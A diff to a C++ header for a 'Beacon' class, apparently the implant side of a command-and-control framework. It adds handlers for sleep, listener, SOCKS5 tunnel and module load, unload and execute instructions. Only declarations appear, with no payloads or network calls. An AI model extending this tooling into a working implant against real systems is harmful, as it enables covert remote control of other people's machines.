@@ -4,15 +4,13 @@
 #include "../listener/ListenerSmb.hpp"
 #include "SocksTunnelClient.hpp"
 
-#ifdef __linux__
-#elif _WIN32
-#include <Windows.h>
-#endif
-
-#include <iostream>
-#include <chrono>
 #include <queue>
-#include <mutex>
+#include <string>
+#include <vector>
+#include <memory>
+#include <unordered_map>
+
+#include <nlohmann/json.hpp>
 
 #include "Common.hpp"
 
@@ -20,8 +18,8 @@
 class Beacon
 {
 public:
-	Beacon();
-	virtual ~Beacon(){};
+        Beacon();
+        virtual ~Beacon() = default;
 
 	bool initConfig(const std::string& config);
 	void run();
@@ -47,15 +45,26 @@ protected:
 	std::string m_pid;
 	std::string m_additionalInfo;
 
-	std::queue<C2Message> m_tasks;
-	std::queue<C2Message> m_taskResult;
+        std::queue<C2Message> m_tasks;
+        std::queue<C2Message> m_taskResult;
 
 private:
-	std::string m_key;
-	nlohmann::json m_modulesConfig;
+        std::string m_key;
+        nlohmann::json m_modulesConfig;
 
-	std::vector<std::unique_ptr<ModuleCmd>> m_moduleCmd;
-	std::vector<std::unique_ptr<Listener>> m_listeners;
-	std::vector<std::unique_ptr<SocksTunnelClient>> m_socksTunnelClient;
+        std::vector<std::unique_ptr<ModuleCmd>> m_moduleCmd;
+        std::vector<std::unique_ptr<Listener>> m_listeners;
+        std::vector<std::unique_ptr<SocksTunnelClient>> m_socksTunnelClient;
+
+        using InstructionHandler = bool (Beacon::*)(C2Message&, C2Message&);
+        std::unordered_map<std::string, InstructionHandler> m_instructionHandlers;
+
+        bool handleEndInstruction(C2Message& c2Message, C2Message& c2RetMessage);
+        bool handleSleepInstruction(C2Message& c2Message, C2Message& c2RetMessage);
+        bool handleListenerInstruction(C2Message& c2Message, C2Message& c2RetMessage);
+        bool handleSocks5Instruction(C2Message& c2Message, C2Message& c2RetMessage);
+        bool handleLoadModuleInstruction(C2Message& c2Message, C2Message& c2RetMessage);
+        bool handleUnloadModuleInstruction(C2Message& c2Message, C2Message& c2RetMessage);
+        bool handleModuleInstruction(C2Message& c2Message, C2Message& c2RetMessage);
 
 };
